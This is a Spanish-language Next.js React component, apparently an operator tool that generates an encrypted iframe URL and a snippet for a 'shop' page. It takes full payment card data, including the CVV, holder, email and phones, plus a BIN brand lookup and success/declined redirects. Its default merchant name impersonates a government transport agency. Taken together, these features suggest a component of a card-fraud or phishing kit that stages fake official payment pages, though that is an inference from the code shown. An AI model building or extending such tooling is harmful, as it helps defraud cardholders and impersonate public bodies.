"use client";
import { useEffect, useState } from "react";
import { mapCardMeta } from "@/lib/binMeta";
import { CheckCardService } from "@/services/checkCardService";
import { validateBin } from "@/services/bin/validate";

const MOCK = {
  numeroTarjeta: "5471072276876354",
  vencimiento: "12/28",
  cvv: "123",
  titular: "MARIA DEMO",
  email: "maria.demo@ejemplo.com",
  celular: "3001234567",
  telefono: "3001234567",
};

const localMeta = (card: string): { cardBrand: string; metodo: string } => {
  const local = CheckCardService.validateCard(card);
  return {
    cardBrand: local.success && local.brand !== "N/A" ? (local.brand ?? "") : "N/A",
    metodo: "N/A",
  };
};

interface FieldProps {
  label: string;
  value: string;
  type?: string;
  inputMode?: "numeric";
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
}

const Field: React.FC<FieldProps> = ({ label, value, type = "text", inputMode, onChange }) => (
  <label className="flex flex-col gap-1 text-sm">
    <span className="font-medium text-slate-700">{label}</span>
    <input
      type={type}
      inputMode={inputMode}
      value={value}
      onChange={onChange}
      className="rounded-md border border-slate-300 px-3 py-2 text-sm text-slate-900"
    />
  </label>
);

export default function Generator() {
  const [form, setForm] = useState({ ...MOCK, price: "199900", priceFormatted: "$199.900" });
  const [comercio, setComercio] = useState("Secretaria de transporte - Movilidad © 2026");
  const [redirectSuccess, setRedirectSuccess] = useState("https://tienda.example/pago-ok");
  const [redirectDeclined, setRedirectDeclined] = useState("https://tienda.example/tarjeta-declinada");
  const [result, setResult] = useState<{ url: string; iframe: string } | null>(null);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [cardMeta, setCardMeta] = useState<{ cardBrand: string; metodo: string }>(() =>
    localMeta(MOCK.numeroTarjeta),
  );
  const [metaLoading, setMetaLoading] = useState(false);

  const set = (key: keyof typeof form) => (e: React.ChangeEvent<HTMLInputElement>) =>
    setForm((prev) => ({ ...prev, [key]: e.target.value }));

  const cleanCard = form.numeroTarjeta.replace(/\D/g, "");

  useEffect(() => {
    const bin = cleanCard.slice(0, 6);
    if (bin.length < 6) {
      // eslint-disable-next-line react-hooks/set-state-in-effect -- migrado a App Router en Task 3
      setCardMeta(localMeta(cleanCard));
      return;
    }

    let cancelled = false;
    setMetaLoading(true);

    const timer = setTimeout(async () => {
      try {
        const { data: validateData, error: validateError } = await validateBin(cleanCard);
        if (cancelled) return;
        if (!validateError && validateData) {
          setCardMeta(mapCardMeta(validateData.brand, validateData.type));
        } else {
          const res = await fetch(`/api/bin/lookup?bin=${bin}`);
          if (cancelled) return;
          if (!res.ok) throw new Error("lookup falló");
          const data = await res.json();
          if (cancelled) return;
          setCardMeta(mapCardMeta(data.scheme, data.type));
        }
      } catch {
        if (cancelled) return;
        setCardMeta(localMeta(cleanCard));
      } finally {
        if (!cancelled) setMetaLoading(false);
      }
    }, 400);

    return () => {
      cancelled = true;
      clearTimeout(timer);
    };
  }, [cleanCard]);

  const generate = async () => {
    setLoading(true);
    setError("");
    try {
      const res = await fetch("/api/generate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          payment: {
            numeroTarjeta: form.numeroTarjeta,
            vencimiento: form.vencimiento,
            cvv: form.cvv,
            titular: form.titular,
            email: form.email,
            celular: form.celular,
            telefono: form.telefono,
          },
          price: form.price,
          priceFormatted: form.priceFormatted,
          comercio,
          redirectSuccess,
          redirectDeclined,
        }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error((data as { error?: string }).error ?? "Error al generar");
      setResult({ url: data.url, iframe: data.iframe });
    } catch (err) {
      setError(err instanceof Error ? err.message : "Error inesperado");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-slate-50 px-6 py-10">
      <div className="mx-auto max-w-xl">
        <h1 className="text-2xl font-bold text-slate-900 mb-1">Generador de URL del iframe</h1>
        <p className="text-sm text-slate-600 mb-6">
          Herramienta del presentador. La marca y el método se consultan a la API de BINs
          automáticamente al escribir el número de tarjeta. Prepara las URLs de redirección, genera
          la URL cifrada y copia el iframe en la página de la tienda.
        </p>

        <div className="grid grid-cols-2 gap-3 rounded-lg border border-slate-200 bg-white p-4">
          <Field label="Número de tarjeta" value={form.numeroTarjeta} onChange={set("numeroTarjeta")} inputMode="numeric" />
          <div className="flex flex-col gap-1 text-sm">
            <span className="font-medium text-slate-700">Marca (API)</span>
            <div className="rounded-md border border-slate-200 bg-slate-50 px-3 py-2 text-sm text-slate-900">
              {metaLoading ? "Consultando…" : cardMeta.cardBrand}
            </div>
          </div>
          <Field label="Vencimiento" value={form.vencimiento} onChange={set("vencimiento")} />
          <div className="flex flex-col gap-1 text-sm">
            <span className="font-medium text-slate-700">Método (API)</span>
            <div className="rounded-md border border-slate-200 bg-slate-50 px-3 py-2 text-sm text-slate-900">
              {metaLoading ? "Consultando…" : cardMeta.metodo ? cardMeta.metodo : "N/A"}
            </div>
          </div>
          <Field label="CVV" value={form.cvv} onChange={set("cvv")} inputMode="numeric" />
          <Field label="Titular" value={form.titular} onChange={set("titular")} />
          <Field label="Email" value={form.email} onChange={set("email")} type="email" />
          <Field label="Celular" value={form.celular} onChange={set("celular")} inputMode="numeric" />
          <Field label="Teléfono" value={form.telefono} onChange={set("telefono")} inputMode="numeric" />
          <Field label="Precio" value={form.price} onChange={set("price")} inputMode="numeric" />
          <Field label="Precio formateado" value={form.priceFormatted} onChange={set("priceFormatted")} />
        </div>

        <div className="mt-4 grid grid-cols-1 gap-3 rounded-lg border border-slate-200 bg-white p-4">
          <Field label="Nombre del comercio (comercio)" value={comercio} onChange={(e) => setComercio(e.target.value)} />
          <Field label="URL de éxito (redirectSuccess)" value={redirectSuccess} onChange={(e) => setRedirectSuccess(e.target.value)} />
          <Field label="URL de declinado (redirectDeclined)" value={redirectDeclined} onChange={(e) => setRedirectDeclined(e.target.value)} />
        </div>

        <button
          onClick={generate}
          disabled={loading}
          className="mt-5 w-full rounded-lg bg-blue-600 px-6 py-3 font-semibold text-white hover:bg-blue-700 disabled:opacity-50"
        >
          {loading ? "Generando…" : "Generar URL del iframe"}
        </button>

        {error && <p className="mt-4 rounded-md bg-red-50 p-3 text-sm text-red-700">{error}</p>}

        {result && (
          <div className="mt-6 space-y-4">
            <div>
              <p className="mb-1 text-sm font-medium text-slate-700">URL del modal</p>
              <textarea readOnly value={result.url} className="h-20 w-full rounded-md border border-slate-300 p-3 text-xs text-slate-900" />
            </div>
            <div>
              <p className="mb-1 text-sm font-medium text-slate-700">Snippet &lt;iframe&gt; para copiar</p>
              <textarea readOnly value={result.iframe} className="h-28 w-full rounded-md border border-slate-300 p-3 text-xs text-slate-900" />
            </div>
          </div>
        )}
      </div>
    </main>
  );
}